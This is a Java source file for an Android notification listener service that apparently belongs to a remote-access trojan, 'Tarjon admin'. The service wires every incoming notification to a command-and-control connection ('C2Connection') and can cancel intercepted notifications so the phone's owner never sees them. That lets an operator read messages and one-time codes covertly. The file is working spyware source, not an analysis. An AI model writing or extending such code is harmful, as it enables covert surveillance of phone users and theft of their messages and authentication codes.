package com.tarjon.admin.services;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import com.tarjon.admin.network.C2Connection;
import com.tarjon.admin.utils.NotificationListener;

/**
 * Notification listener service for intercepting system notifications
 */
public class TarjonNotificationListenerService extends NotificationListenerService {
    private static final String TAG = "TarjonNotification";
    
    private NotificationListener notificationListener;
    private C2Connection c2Connection;
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        Log.d(TAG, "Notification listener service created");
        
        // Initialize C2 connection
        c2Connection = C2Connection.getInstance(this);
        
        // Initialize notification listener
        notificationListener = new NotificationListener(this, c2Connection);
    }
    
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        Log.d(TAG, "Notification posted: " + sbn.getPackageName());
        
        // Process the notification
        boolean intercepted = notificationListener.processStatusBarNotification(sbn);
        
        // Cancel notification if interception is enabled
        if (intercepted) {
            try {
                cancelNotification(sbn.getKey());
            } catch (Exception e) {
                Log.e(TAG, "Error cancelling notification: " + e.getMessage());
            }
        }
    }
    
    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Optional: track notification removal
    }
    
    /**
     * Enable or disable notification interception
     * @param intercept Whether to intercept notifications
     */
    public void setInterceptNotifications(boolean intercept) {
        if (notificationListener != null) {
            notificationListener.setInterceptNotifications(intercept);
        }
    }
    
    @Override
    public void onDestroy() {
        Log.d(TAG, "Notification listener service destroyed");
        super.onDestroy();
    }
}